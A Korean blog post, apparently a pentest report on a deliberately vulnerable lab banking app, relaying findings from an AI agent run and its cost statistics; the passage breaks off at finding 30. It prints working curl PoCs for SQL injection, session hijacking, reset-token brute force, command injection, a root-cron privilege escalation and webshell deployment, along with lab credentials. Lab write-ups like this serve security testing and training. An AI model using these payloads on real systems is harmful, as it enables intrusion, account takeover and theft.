---
title: '침투 테스트 보고서: 192.168.6.167 단일 ip 대상'
date: 2026-10-28 00:00:00 +0900
categories:
- Pentest
tags:
- pentest
- web
author: mmamm4
---

# 침투 테스트 보고서: 192.168.6.167 단일 ip 대상

> **Note:** 실습용 가상 대상
> 이 글의 "모두뱅크(modubank)"는 침투 테스트 실습을 위해 직접 구축한 **가상 대상 애플리케이션**입니다. 실재하는 금융기관이나 서비스와는 아무 관련이 없습니다. 모든 작업은 격리된 로컬 랩 환경(사설 IP `192.168.6.167`)에서만 수행했으며, 외부 시스템을 대상으로 하지 않았습니다.

같은 대상(`192.168.6.167`, 모두뱅크 웹 애플리케이션)에 LLM을 OpenRouter의 DeepSeek V4.1 Flash로 두고, 작업 목표를 "발생할 수 있는 모든 취약점 찾기"로 바꿔 ARTEX를 실행한 결과입니다. 아래 취약점 항목과 PoC는 ARTEX 최종 보고서에서 옮겼고, 시간·호출·토큰 수치는 kali_mcp로 확인한 ARTEX 트랜스크립트(`data/transcripts/exp10-*.jsonl`, 시각은 UTC)에서 집계했습니다. 요청을 수동으로 재현하지는 않았으므로, 개별 항목은 ARTEX가 기록한 응답을 근거로 합니다. 같은 "전체 취약점" 목표의 Claude Haiku 실행은 2026-10-27-artex-claude-haiku-modubank-full-audit에, 같은 모델의 셸 획득 목표 실행은 2026-10-27-artex-deepseek-modubank-findings에 있습니다.

> **Warning:** 읽기 전 유의
> 아래 목록은 ARTEX가 보고한 원문을 정리한 것으로, 세 가지를 감안해 읽어 주시기 바랍니다. ① **중복**: 같은 결함이 여러 worker에서 따로 보고돼 53건에 로그인 SQL 인젝션(5·18번), Actuator 노출(39·44번), 오픈 리다이렉트(46·49번), notice 경로순회(27·45번), 템플릿 주입(23·28번) 등이 중복으로 들어 있습니다. 유형을 묶으면 실제 결함 수는 이보다 적습니다. ② **심각도 기준**: ARTEX가 부여한 등급을 그대로 옮겼고, 같은 결함에 다른 등급이 붙은 경우(예: Actuator 39번 HIGH·44번 MEDIUM)도 있습니다. ③ **자격증명·계좌 수치 변동**: 실행 중 도구가 비밀번호 변경·이체·계정 생성을 반복해 항목마다 관리자 비밀번호(admin123·Adm!Pwn2026·Admin!Pwn2026·`b`)와 사용자 수(21·75·78·98)가 엇갈립니다. 같은 시점의 상태가 아니므로 한 장면으로 합쳐 읽을 수 없습니다.

## 소요 시간과 크레딧 비용

- **모델**: OpenRouter DeepSeek V4.1 Flash (`deepseek/deepseek-v4.1-flash`), ARTEX 실행 exp10
- **소요 시간**: 약 2시간 59분
- **규모**: planner 1 + worker 55, LLM 호출 3,788회, Bash 3,584회, `report_finding` 54회
- **토큰**: 입력 162,402,101(이 중 캐시 read 154,211,093, 약 95%) / 출력 3,898,789
- **크레딧 비용(추정)**: 약 **3.43달러**

| 항목 | 토큰 | 단가(100만 토큰당) | 비용 |
|---|---:|---:|---:|
| 비캐시 입력 | 8,191,008 | 0.14달러 | 약 1.15달러 |
| 캐시 read | 154,211,093 | 0.0042달러 | 약 0.65달러 |
| 출력 | 3,898,789 | 0.42달러 | 약 1.64달러 |
| 합계 | | | 약 3.43달러 |

## 개요

- **작업 목표**: 192.168.6.167 단일 ip 대상으로 발생할 수 있는 모든 취약점 찾아줘.
- **생성 시각**: 2026-10-28 03:03:55

## 요약

- 확인된 취약점: **53**건
  - CRITICAL: 19건
  - HIGH: 21건
  - MEDIUM: 9건
  - LOW: 4건
- 자산: app 1, endpoint 56, ip 1, root_domain 1, service 14

## 취약점

### 1. [CRITICAL] 관리자 대시보드(/admin) 수직적 접근통제 부재 → 전 사용자 평문 자격증명 노출 및 관리자 계정 장악

GET /admin 은 무인증 시 302 /login 이지만, 인증된 아무 저권한 USER 세션(MODU_SID) 또는 사전 로그인 없이 예측 가능한 MODU_SID 값(1001/1002 등)만 보내도 200으로 관리자 대시보드가 렌더링된다(80/8080 동일). 페이지에는 사용자 98행의 아이디/평문 비밀번호/이름/권한과 전체 계좌번호/잔액 표가 그대로 출력되어(예: admin / b / 시스템관리자 / ADMIN, kim01 / Pwn!2026, lee02 / Bf!2026x, 계좌 110-234-567890 잔액 1,000,000,002,127,134,644) 모든 계정이 즉시 장악 가능합니다. 실제로 이 표에서 읽은 admin 평문 비밀번호 "b" 로 POST /login 하여 302 /admin + 신규 MODU_SID(1048) 관리자 세션을 획득하고 "시스템관리자님 반갑습니다" 화면까지 확인했습니다. 서버는 역할 기반 인가를 전혀 수행하지 않고 MODU_SID 존재 여부만으로 관리자 화면을 노출합니다.

### 2. [CRITICAL] 비밀번호 재설정 /verify 단계의 토큰 미검증·토큰 노출 + 무인증 /request 로 임의 계정(admin 포함) 탈취

POST /find-password/verify 는 재설정 토큰을 입력값으로 요구하지도, 검증하지도 않습니다. username 과 보안질문 답변만 보내면 서버가 DB에 저장된 유효 reset_token 을 응답 HTML 의 hidden 필드(name="token")에 그대로 실어 반환한다(코드: AuthController.verifyAnswer → model.addAttribute("token", user.getResetToken())). 한편 POST /find-password/request 는 인증·캡차·레이트리밋 없이 호출 가능해 공격자가 임의 계정의 토큰을 먼저 발급시킬 수 있고, POST /find-password/reset 은 token 값 하나만 대조하므로 최종적으로 보안질문 답변만 알면 임의 계정 비밀번호를 재설정할 수 있습니다. 실제로 admin(답변 '파랑')과 kim01(답변 '서울초등학교')의 비밀번호를 PoC로 변경한 뒤 새 비밀번호로 로그인하여 각각 302 /admin, 302 /bank/dashboard 세션을 얻었고(관리자 대시보드 200/23,026바이트 열람) 이후 원복했습니다. 보안질문 답변은 DB에 평문(security_answer)으로 저장되며 기존 확정 SQLi(`#308`/`#344`)로 그대로 추출 가능하고, /verify 에는 실패 잠금이 없어(40회 연속 오답 후에도 정답 처리) 답변 브루트포스도 가능합니다.

### 3. [CRITICAL] 전역 쓰기 가능한 root cron 스크립트를 통한 로컬 권한상승(tomcat→root)

존재하는 root cron(/etc/cron.d/modubank-log-cleanup, 매분 실행)이 참조하는 /opt/modubank/scripts/log-cleanup.sh 가 777 권한이라, tomcat 권한(=확정 RCE 권한)으로 내용을 바꿔 root로 임의 명령 실행이 가능합니다. 실제로 스크립트를 덮어써 1분 뒤 root 권한으로 /etc/shadow 사본·id 출력을 얻었습니다.

### 4. [CRITICAL] /bank/account/{id} 거래내역 search 파라미터 UNION SQL Injection + 계좌 소유권 검증 부재(IDOR)

거래내역 조회 화면 GET /bank/account/{id} 의 search 파라미터가 MyBatis TransactionMapper.xml 의 `${searchClause}` 문자열 치환으로 WHERE 절에 그대로 삽입되어 UNION 기반 SQLi가 성립합니다. kim01(일반 USER) 세션으로 search=' UNION SELECT ... FROM users -- - 를 보내 users 테이블 전체(78행)의 username·평문 password·role과 accounts 전체 행을 화면에 출력시켜 admin:Adm!Pwn2026 를 회수했고, control(무효 키워드) 대비 응답 크기 2,679→97,976바이트로 차이가 명확합니다. 아울러 동일 엔드포인트가 {id} 경로변수의 계좌 소유권을 검사하지 않아 kim01 이 계좌 2(110-345-678901)·계좌 3(110-456-789012)의 거래내역 전체(상대계좌·금액·잔액·메모)를 열람할 수 있습니다. 기존 확정 SQLi(`#263` check-account 블라인드, `#308` /login)와 별개의 신규 주입 지점입니다.

### 5. [CRITICAL] POST /login 아이디(username) 파라미터 SQL 인젝션 — 인증 우회 및 에러 기반 전 데이터 추출

POST /login 의 username 파라미터가 MyBatis UserMapper.xml 의 'SELECT * FROM users WHERE username = ? AND password = ?' 에 문자열 결합으로 들어가 SQLi가 성립합니다. admin'-- - 로 비밀번호 없이 관리자 인증 우회(302 /admin, MODU_SID 발급)와 error-based extractvalue 기반 DB 전 데이터 추출(modubank 스키마: users 75건 계정·평문 비밀번호·api_key·reset_token, accounts 잔액)이 실증됨. 비밀번호 필드도 동일하게 주입됨. X-API-KEY 계정 API 계정 조회(accountId)는 Long 타입 강제로 SQLi 불가.

### 6. [CRITICAL] 세션 고정(Session Fixation) — 로그인 후 JSESSIONID 미재발급으로 인한 계정 탈취

192.168.6.167 로그인 시 서버가 JSESSIONID를 재발급(regenerate)하지 않아 세션 고정 공격이 성립합니다. 공격자가 미인증 세션 ID를 먼저 획득해 피해자에게 심어두면, 피해자가 그 JSESSIONID로 로그인한 뒤에도 동일 세션이 그대로 인증 상태가 되어 공격자가 같은 ID로 피해자 계정(테스트 계정 sess266, SessionTester)으로 은행 대시보드에 접근할 수 있음을 실측 확인했습니다. 추가로 세션 ID가 URL rewriting(`;jsessionid=<ID>`)으로도 유지되어 URL만으로 세션 ID가 노출됩니다.

### 7. [CRITICAL] 예측가능 MODU_SID를 통한 관리자 세션 장악 → 관리자 비밀번호 변경 및 임의 계좌 자금 변조(초과인출)

MODU_SID=1002(관리자) 쿠키만으로 JSESSIONID·CSRF·캡차 검증을 모두 우회해 관리자 계정 비밀번호를 영구 변경할 수 있고(실제 변경 후 admin 로그인 302 /admin 성공, 이후 원복), 동일 세션으로 /bank/transfer 의 fromAccountId 를 조작해 타 계좌 자금을 이동시킬 수 있습니다. kim01 세션으로도 fromAccountId=2 에 5,000,000원 이체를 실행해 잔액 1,001,000원 계좌를 -3,999,000원(음수)으로 만들고 수취 계좌를 5,000,001원으로 부풀리는 초과인출·데이터 변조가 성립했습니다. 다만 /admin 하위에는 사용자 생성/삭제/권한변경 전용 엔드포인트가 없어(GET /admin 대시보드 하나뿐) 해당 기능은 부재함을 확인했습니다.

**PoC / 증거:**

```
[1] 관리자 비밀번호 변경(캡차/CSRF/JSESSIONID 불필요)
$ curl -s -b "MODU_SID=1002" -X POST http://192.168.6.167/mypage/change-password -d 'newPassword=i234Tmp!Pw&captchaAnswer=0000&__captcha_hint=0000'
→ 200, "변경되었습니다"
$ curl -s -i -d 'username=admin&password=i234Tmp%21Pw' -X POST http://192.168.6.167/login
HTTP/1.1 302
Set-Cookie: MODU_SID=1037
Location: http://192.168.6.167/admin
(검증 후 원래 비밀번호 Adm!Pwn2026 로 원복 완료)

[2] 관리자 SID로 타 계좌 자금 이동
$ curl -s -b "MODU_SID=1002" -X POST http://192.168.6.167/bank/transfer \
  -d 'fromAccountId=1&toAccountNo=110-345-678901&amount=1000&memo=i234admin&csrfToken=x&securityToken='
→ 200, 계좌1 1,000,000,002,127,134,648 → 1,000,000,002,127,133,648원, 계좌2 1,000,000 → 1,001,000원

[3] kim01(MODU_SID=1033) 세션으로 타인 계좌 지정 → 음수 잔액(초과인출)
$ curl -s -b "MODU_SID=1033" -X POST http://192.168.6.167/bank/transfer \
  -d 'fromAccountId=2&toAccountNo=110-456-789012&amount=5000000&memo=i234overdraft&csrfToken=x&securityToken='
→ 200, 계좌2 1,001,000 → -3,999,000원, 계좌3 0 → 5,000,001원 (이후 원복)

[4] /admin 계열 상태변경 엔드포인트 부재 확인
$ curl -s http://192.168.6.167:8080/actuator/mappings | grep '/admin'
=> {"patterns":["/admin"],"methods":["GET"]} handler=AdminController#dashboard  (유일)
추측 경로 /admin/users, /admin/create-user, /admin/role, /admin/balance → GET/POST 모두 500
```

### 8. [CRITICAL] Tomcat Manager 기본 자격증명(admin:tomcat) + 외부 노출 → manager-script WAR 배포 웹셸 RCE

8080 포트 Apache Tomcat 11.0.14 의 /manager, /host-manager 가 외부에 노출(manager/META-INF/context.xml 의 RemoteAddrValve 제거)되어 있고, tomcat-users.xml 의 admin:tomcat(manager-gui/script/jmx/status)이 그대로 유효합니다. admin:tomcat 으로 /manager/html(200)·/manager/text/list(200) 인증에 성공했고, manager-script API 로 악성 WAR 를 /i227 컨텍스트에 배포한 뒤 http://192.168.6.167:8080/i227/index.jsp?c=id 로 tomcat(uid=990) 권한 임의 명령 실행(RCE)을 실증했습니다.

### 9. [CRITICAL] /find-password 6자리 예측가능 토큰 노출·브루트포스 및 계정 열거 → 관리자 계정 탈취

비밀번호 재설정 토큰이 java.util.Random 기반 6자리 숫자이며 요청 화면에 평문으로 노출되고, /find-password/reset 검증에 레이트리밋이 없어 1000개 구간을 1초에 전수 가능합니다. /request 는 "존재하지 않는 아이디입니다" 로 계정 열거가 가능하고, 유효 토큰만 알면 보안질문 검증(/verify)을 거치지 않고도 /reset 으로 임의 계정(admin 포함) 비밀번호를 재설정할 수 있어 관리자 계정 탈취로 이어졌습니다.

**PoC / 증거:**

```
$ curl -X POST http://192.168.6.167/find-password/request --data "username=kim01"
→ <div class="alert alert-warn">(데모용 안내) 발급된 재설정 토큰: <b>345308</b></div>
$ curl -X POST http://192.168.6.167/find-password/request --data "username=zzz_nouser999"
→ <div class="alert alert-danger">존재하지 않는 아이디입니다.</div>   (kim01 은 보안질문 화면)
# 6자리 토큰 브루트포스(레이트리밋 없음): 1000개 구간 1.0초
$ python3 bf.py lee02 344808 345808  → scanned 1000 in 1.0s hit=345308
# 재설정 → 관리자 계정 탈취
$ curl -X POST http://192.168.6.167/find-password/reset --data "username=admin&token=192120&newPassword=Admin!Pwn2026"
→ 비밀번호가 변경되었습니다 ; login admin/Admin!Pwn2026 → 302 /admin
```

### 10. [CRITICAL] /bank/transfer CSRF·토큰 검증 부재 + fromAccountId IDOR + 음수/오버플로 금액 조작

POST /bank/transfer 는 csrfToken·securityToken 을 서버에서 전혀 검증하지 않고 Origin/Referer 도 확인하지 않아 교차 사이트에서 임의 이체가 가능하다(CSRF). 또한 fromAccountId 를 검증 없이 신뢰해 타인 계좌에서 출금(IDOR)할 수 있고, amount 에 음수·거대값(999999999999999999)을 넣으면 잔액이 반대 방향으로 조작/폭증합니다.

### 11. [CRITICAL] Hardcoded DB Credentials / Sensitive Data Exposure & Database Data Leakage

RCE를 통해 애플리케이션 설정 파일에서 운영 MariaDB 접속 자격증명이 평문으로 탈취된다(/opt/modubank/config/application.yml, /opt/tomcat/webapps/ROOT/WEB-INF/classes/application.yml: username modubank / password modubank!2024). 또한 application.yml 내 modubank.security.backdoor-admin-key="modubank-super-secret-2018" 백도어 키가 그대로 노출됩니다. 이 자격증명으로 127.0.0.1:3306 MariaDB(modubank DB)에 직접 접속하여 users 전 계정 평문 비밀번호·accounts 계좌/잔액 등 은행 데이터 전체를 유출했습니다.

**PoC / 증거:**

```
host=127.0.0.1|cat /opt/modubank/config/application.yml -> username: modubank / password: modubank!2024 (jdbc:mariadb://127.0.0.1:3306/modubank)
host=127.0.0.1|grep -ri backdoor /opt/tomcat/webapps/ROOT/WEB-INF/classes -> backdoor-admin-key: "modubank-super-secret-2018"
host=127.0.0.1|mysql -umodubank -p'modubank!2024' -h127.0.0.1 modubank -e 'select id,username,password,role from users; show tables;'
 -> admin/admin123(ADMIN), kim01/password1, lee02/qwer1234, park03/letmein, sec01/Test@12345 ...; users, accounts, board, login_attempts, transactions, uploaded_files
host=127.0.0.1|... -e 'select count(*) from accounts; select * from accounts limit 5;' -> 3건, 110-234-567890 잔액 5000000 등
```

### 12. [CRITICAL] Local Privilege Escalation (root via root-cron world-writable script)

/opt/modubank/scripts/log-cleanup.sh 가 world-writable(rwxrwxrwx)이고 /etc/cron.d/modubank-log-cleanup 에 의해 root 권한으로 1분마다 실행됩니다. 명령주입 RCE(tomcat, uid=990)로 이 파일을 덮어쓰면 다음 cron 주기에 root(system_cronjob_t)로 임의 명령이 실행되어 완전한 root 권한 상승이 가능합니다. root 권한으로 /etc/shadow 까지 읽어냈습니다.

**PoC / 증거:**

```
[근거1 원본/권한] host=127.0.0.1|ls -la /opt/modubank/scripts/ ; cat /etc/cron.d/modubank-log-cleanup
 -> -rwxrwxrwx. 1 root root 180 ... log-cleanup.sh  /  * * * * * root /opt/modubank/scripts/log-cleanup.sh
[근거2 주입] host=127.0.0.1|cp /opt/modubank/scripts/log-cleanup.sh /tmp/lc.bak; printf '#!/bin/sh\n{ id; head -3 /etc/shadow; } > /tmp/shadow.proof\n' > /opt/modubank/scripts/log-cleanup.sh
[근거3 다음 cron 주기 후] host=127.0.0.1|cat /tmp/shadow.proof
 -> uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:system_cronjob_t:s0-s0:c0.c1023
    root:$6$965Pi/5f9dNxyeLz$ehF0xa25YmVynZ3gZycPyz/keNbR26ZW30JiiVVmPEGeI.aZiWwKcjX6eA0Na5kY3XT8XlTAkUg/1uD1pwQJo.::0:99999:7:::
[검증 후 복구] cp /tmp/lc.bak /opt/modubank/scripts/log-cleanup.sh (원복 완료, md5sum 73ffd0767a7632b17d207d2cc72f1088)
- RCE 진입점: host=127.0.0.1|id -> uid=990(tomcat) (confirmed finding 209)
```

### 13. [CRITICAL] 업로드 파일명 경로 조작(filename=../../ROOT/)으로 웹루트 임의 위치 JSP 배치 → RCE

멀티파트 filename 파라미터의 ../ 시퀀스가 정규화 없이 저장 경로에 결합되어 filename=../../ROOT/root222.jsp 로 업로드 디렉터리 밖 웹루트(/opt/tomcat/webapps/ROOT)에 JSP 를 배치할 수 있었습니다. 배치한 root222.jsp 로 tomcat 권한 임의 명령 실행을 확인했습니다.

### 14. [CRITICAL] GET /files/download?name= 절대경로/경로조작으로 임의 파일 읽기 (설정·DB 자격증명 유출)

GET /files/download 의 name 파라미터가 업로드 디렉터리로의 경로 고정 없이 그대로 java.nio.file.Files 로 읽혀, name=/opt/modubank/config/application.yml 처럼 절대경로를 주면 임의 파일을 읽을 수 있습니다. DB 자격증명(modubank/modubank!2024)과 Tomcat manager 계정(admin/tomcat)이 무인증으로 유출됩니다.

### 15. [CRITICAL] 인증 후 파일 업로드 무제한 확장자 우회 → JSP 웹셸 업로드 및 RCE

POST /files/upload 가 확장자·Content-Type 필터를 전혀 하지 않아 .jsp 웹셸이 그대로 업로드되고, 저장 디렉터리 /opt/tomcat/webapps/ROOT/uploads 가 nginx 로 정적 서빙됨과 동시에 Tomcat 이 JSP 로 실행합니다. 업로드한 i222.jsp 로 tomcat 권한(uid=990) 임의 명령 실행이 가능하며 인증 없이 /uploads/i222.jsp 로 접근됩니다.

### 16. [CRITICAL] 기본/약한 관리자 자격증명 (admin/admin123)

관리자 계정이 기본 자격증명 admin/admin123 으로 로그인됩니다. 로그인 성공 시 관리자 세션이 발급되어 /admin 관리자 대시보드에 접근 가능하며, 여기서 전체 사용자 계정과 평문 비밀번호, 전체 계좌 목록이 그대로 노출됩니다.

**PoC / 증거:**

```
$ curl -s -i -X POST http://192.168.6.167/login -d "username=admin&password=admin123"
HTTP/1.1 302
Set-Cookie: JSESSIONID=...; Path=/; HttpOnly
Set-Cookie: MODU_SID=1003; Path=/
Location: http://192.168.6.167/admin

$ curl -s -X POST http://192.168.6.167/login -d "username=zzznope&password=zzznope"
<div class="alert alert-danger">아이디 또는 비밀번호가 올바르지 않습니다.</div>
=> 응답 본문/오류로 계정 존재·정답 여부를 구분 가능(사용자 열거).
```

### 17. [CRITICAL] 예측 가능한 MODU_SID 쿠키로 인한 세션 하이재킹

로그인 시 발급되는 MODU_SID 쿠키가 순차 증가하는 단순 정수(1001, 1002, ...)이며 서버가 이를 진짜 세션 식별자로 신뢰합니다. 유효한 JSESSIONID 없이 Cookie: MODU_SID=1002 만 보내면 admin(SID=1002)으로, MODU_SID=1001 이면 다른 사용자(테스터)로 인증되어 /admin 등 보호자원에 접근할 수 있다(kr.co.modubank.auth.PredictableSidAuthFilter).

**PoC / 증거:**

```
$ for sid in $(seq 1000 1007); do curl -s -o /tmp/x -w "SID=$sid %{http_code} " -H "Cookie: MODU_SID=$sid" http://192.168.6.167/admin; grep -oE "[^<>]*님 반갑습니다" /tmp/x; done
SID=1001 200 테스터님 반갑습니다
SID=1002 200 시스템관리자님 반갑습니다
SID=1003..1006 200 시스템관리자님 반갑습니다
SID=1007 302
(로그인 응답도 순차 정수 부여: Set-Cookie: MODU_SID=1001 / 1011 ...)
```

### 18. [CRITICAL] /login username 파라미터 SQL 인젝션 (인증 우회 + DB 전량 탈취)

로그인 폼 POST /login 의 username 파라미터가 MyBatis 매퍼(kr.co.modubank.user.UserMapper.xml / findByIdRawSqlForLogin, AuthService.loginLow)에서 문자열 결합으로 SQL 에 삽입됩니다. 'admin' # 또는 'admin' OR '1'='1 로 비밀번호를 몰라도 admin 계정으로 인증 우회(302 -> /admin)가 가능하고, UNION SELECT 로 서버 DB(modubank, MariaDB 10.5.29)의 users/accounts/board 등 전체 데이터를 오류 메시지로 탈취할 수 있습니다.

**PoC / 증거:**

```
$ curl -s -i -X POST http://192.168.6.167/login --data-urlencode "username=admin' #" --data-urlencode "password=whatever"
HTTP/1.1 302
Set-Cookie: MODU_SID=1006; Path=/
Location: http://192.168.6.167/admin;jsessionid=5A97BDA1...

# 열 서버오류로 쿼리/DB 정보 노출:
$ curl -s -X POST http://192.168.6.167/login --data-urlencode "username=z' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14 #" --data-urlencode "password=x"
Error attempting to get column 'reset_token_expiry' ... SQLDataException: value '11' (VARSTRING) cannot be decoded as ZoneDateTime
### SQL: SELECT * FROM users WHERE username = 'zzz' UNION SELECT 1,2,3,4,5 #' AND password = 'x'
### Cause: The used SELECT statements have a different number of columns

$ curl ... "username=z' UNION SELECT concat_ws(0x7c,user(),current_user(),@@version,@@datadir),2,... #"
value 'modubank@localhost|modubank@localhost|10.5.29-MariaDB|/var/lib/mysql/' cannot be decoded
```

### 19. [CRITICAL] /bank/connectivity/check 의 host 파라미터 OS 명령어 주입(RCE)

로그인 후 GET /bank/connectivity/check?host= 값이 셸 명령(ping)에 직접 삽입되어, 파이프(|)로 임의 명령을 이어붙이면 서버에서 tomcat 권한으로 실행됩니다. 리버스셸/웹쉘 없이 즉시 RCE가 가능합니다.

**PoC / 증거:**

```
curl -s -b cookies.txt --get --data-urlencode 'host=127.0.0.1|id' http://192.168.6.167/bank/connectivity/check
-> uid=990(tomcat) gid=990(tomcat) groups=990(tomcat) context=system_u:system_r:unconfined_service_t:s0
(host=127.0.0.1|uname -a -> Linux localhost.localdomain 5.14.0-162.6.1.el9_1.x86_64 ..., host=127.0.0.1|cat /etc/passwd -> root:x:0:0 ... tomcat:x:990:990 / bankop:x:1000:1000 ... 노출)
```

### 20. [HIGH] 전역 예외 처리기(GlobalExceptionHandler) 스택트레이스 페이지의 미이스케이프 반사 → 반사형 XSS (MODU_SID 탈취 → /admin 평문 비밀번호 열람)

/bank/transfer 의 long 타입 amount 파라미터에 HTML 페이로드를 넣으면 Spring 바인딩 예외(MethodArgumentTypeMismatchException / NumberFormatException)가 발생하고, GlobalExceptionHandler(LOW/MEDIUM)가 `"<h2>500 Internal Server Error</h2><pre>" + ex.printStackTrace(sw) + "</pre>"` 를 이스케이프 없이 text/html 로 반환해 입력값이 그대로 HTML로 렌더링됩니다. Playwright(실제 Chromium)로 `<svg/onload=...>` 가 실행되어 document.cookie 를 읽는 것을 확인했고, 공격자 페이지(file://)에서 자동 submit → 피해자(관리자 MODU_SID=1002) 쿠키 탈취 → 탈취 쿠키만으로 GET /admin 200(94행 평문 비밀번호 테이블) 까지 실증했습니다. 인증 없이(무세션)도 동일하게 발화해 로그인 전 방문자도 공격 대상입니다.

### 21. [HIGH] world-writable sudo 허용 스크립트 /opt/modubank/scripts/backup.sh(777)를 통한 bankop→root 권한상승

bankop 계정에 (root) NOPASSWD: /opt/modubank/scripts/backup.sh 가 sudoers로 허용되어 있는데, 해당 스크립트가 -rwxrwxrwx(root root)로 전 사용자 쓰기 가능합니다. 내용을 덮어쓴 뒤 sudo로 실행하면 uid=0(root)로 명령이 실행됩니다.

### 22. [HIGH] SSH 계정 bankop이 애플리케이션 설정 파일의 DB 비밀번호를 그대로 재사용(modubank!2024) — 원격 SSH 로그인 성립

/opt/tomcat/webapps/ROOT/WEB-INF/classes/application.yml의 datasource.password(modubank!2024)가 로컬 OS 계정 bankop의 SSH 비밀번호로 재사용되어, 외부에서 22/tcp로 bankop(uid=1000) 셸 획득이 가능합니다. 열거 단계에서 신규 공격면으로 드러난 유일한 실질 취약점입니다.

### 23. [HIGH] Server-Side Template Injection (SSTI) → Spring Bean 경유 임의 SQL 실행

`#352`로 확정된 Thymeleaf SSTI(templates/notice/ 악성 템플릿 + GET /board/notice?doc=)가 단순 식 평가(`7*7=49`)에 그치지 않고, Spring 컨텍스트 빈 참조(@jdbcTemplate 등)를 통해 서버측 임의 SQL 실행까지 도달함을 실제 업로드 템플릿 PoC로 확인했습니다. 다만 T()/new 기반 클래스 접근은 Thymeleaf Spring6 ACL(ThymeleafEvaluationContextACLTypeLocator)로 차단되어 500이 반환되고, JdbcTemplate 경유 SELECT ... INTO OUTFILE 웹쉘 드롭은 mariadb(mysql 계정)가 tomcat 소유 웹루트에 쓸 수 없어(Errcode 13 Permission denied), mariadb systemd PrivateTmp로 /tmp 경유 우회도 불가하여 OS 명령 실행(RCE)으로의 승격은 성립하지 않았습니다.

### 24. [HIGH] /mypage/api-key 오픈뱅킹 API 키 평문 노출 — 예측 가능한 MODU_SID와 결합해 자격증명 없이 타 사용자 키 탈취

GET /mypage/api-key 는 로그인 세션 사용자의 오픈뱅킹 API 키를 마스킹 없이 평문으로 렌더링한다(템플릿 `th:text="${apiKey}"`, API 예시 영역에도 재출력). 인증이 예측 가능한 정수 MODU_SID 단독에 의존하므로, 자격증명 없이 Cookie: MODU_SID=1011(김민준/kim01)·1029(이서연/lee02) 만 보내 각 사용자의 실제 키(mb_live_kim01_9f3a7c2e1d, mb_live_lee02_4b8e0a6f2c)를 그대로 획득했습니다. 획득한 키는 X-API-KEY 헤더만으로 /api/v1/accounts/{accountId} 를 호출해 소유자 검증 없이 타인 계좌(admin 110-234-567890 포함)의 잔액·계좌번호·거래건수를 열람할 수 있어, 세션 없이도 계좌 정보 유출로 직결됩니다.

### 25. [HIGH] 모두뱅크 상태변경 엔드포인트의 CSRF 방어 부재 — 송금·비밀번호 변경·게시글·업로드 강제 실행

192.168.6.167 모두뱅크의 상태변경 엔드포인트(POST /bank/transfer, POST /mypage/change-password, POST /board/write, POST /files/upload)는 CSRF 토큰을 검증하지 않고, 인증이 MODU_SID 쿠키 단독에 의존하며, 그 쿠키에 SameSite/HttpOnly/Secure가 전혀 없습니다. 교차 출처(Origin/Referer=evil) 위조 요청만으로 실제 송금(잔액 감소 확인), 비밀번호 변경(변경 후 신규 비밀번호로 로그인 성공), 게시글 작성, 파일 업로드가 그대로 실행됨을 PoC로 확인했습니다.

### 26. [HIGH] DOM-based XSS

모두뱅크 /bank/dashboard 는 location.hash(프래그먼트)를 decodeURIComponent 후 recentAccountBanner.innerHTML 에 그대로 대입한다(소스 주석상 [의도적 취약점 - XSS (DOM)]). 실제 Chromium(Playwright)으로 `#<img src=x onerror=...>` 및 `#<svg/onload=...>`를 로드해 onerror/onload 핸들러가 실행됨을 확인했고, 실행된 JS가 document.cookie 를 읽어 MODU_SID 를 탈취할 수 있었습니다. MODU_SID는 HttpOnly 미설정(`#294`)이라 스크립트에서 그대로 읽히지만, JSESSIONID는 HttpOnly가 설정돼 있어 document.cookie로는 읽히지 않았습니다. 다만 서버 인증이 MODU_SID 단독으로 성립함(모든 화면 200)도 확인해 탈취한 쿠키만으로 세션 재사용이 가능합니다. 서버로 전송되지 않는 프래그먼트 기반 순수 클라이언트측 결함으로, `#349`/`#351`의 서버측 리다이렉트·이스케이프 계층과 메커니즘이 다릅니다. vulnLevel=HIGH 로 바뀌어도 span.innerHTML = hash 경로가 남아 있어(로컬 재현으로 발화 확인) 완화되지 않습니다.

### 27. [HIGH] NoticeController doc 파라미터 템플릿 경로순회로 비인가 보호 템플릿(관리자 대시보드) 렌더링

GET /board/notice?doc=../admin/dashboard 가 인증/권한 검사 없이 200으로 관리자 대시보드 템플릿을 렌더링합니다. LOW 레벨(vulnLevel 기본값)에서 doc 값을 필터링 없이 "notice/" + doc 로 반환하는 것이 원인이며, ../board/list, ../mypage/api-key 등 임의 템플릿도 동일하게 열람됩니다.

### 28. [HIGH] Thymeleaf 템플릿 업로드 → 서버측 템플릿 표현식 주입(SSTI)

/files/upload 의 filename 경로순회(기존 `#230`)로 Tomcat 이 실제 렌더링하는 템플릿 디렉터리(/opt/tomcat/webapps/ROOT/WEB-INF/classes/templates/notice/)에 HTML 파일을 배치하고, GET /board/notice?doc= 의 doc 파라미터로 그 템플릿을 지정하면 Thymeleaf 가 파일 내용을 템플릿으로 파싱·평가합니다. 업로드한 템플릿에 `th:text="${7*7}"` 를 넣자 응답이 "49" 로 치환되어 서버측 표현식 평가(템플릿 주입)가 성립함을 확인했습니다. 다만 T(java.lang.Runtime)/T(java.lang.System)/new java.io.File 등 임의 클래스 접근은 Thymeleaf 표현식 제한으로 500(SpelEvaluationException 계열)이 떨어져 즉시 RCE 로는 이어지지 않았습니다.

### 29. [HIGH] /login SQLi → MariaDB FILE 권한 악용 임의파일 읽기/쓰기 (LOAD_FILE·INTO OUTFILE)

POST /login의 확정 SQLi(`#308`)를 통해 DB 사용자 modubank@localhost가 FILE 권한을 보유하고 secure_file_priv가 미설정('')임을 확인했습니다. LOAD_FILE()로 /etc/passwd, nginx 설정, /opt/modubank/config/application.yml(DB 평문 자격증명 modubank:modubank!2024) 등 임의 파일을 읽었고, INTO OUTFILE로 /tmp·/var/tmp·/var/lib/mysql에 파일을 써서 내용을 회수해 쓰기까지 실증했습니다. 다만 웹루트·MariaDB plugin 디렉터리는 DB 프로세스 쓰기 권한이 없어(Errcode 13) SQLi만으로의 JSP 웹셸/UDF RCE 승격은 불성립.

### 30. [HIGH] nginx(80) → Tomcat(8080) 역프록시 CL.TE HTTP Request Smuggling

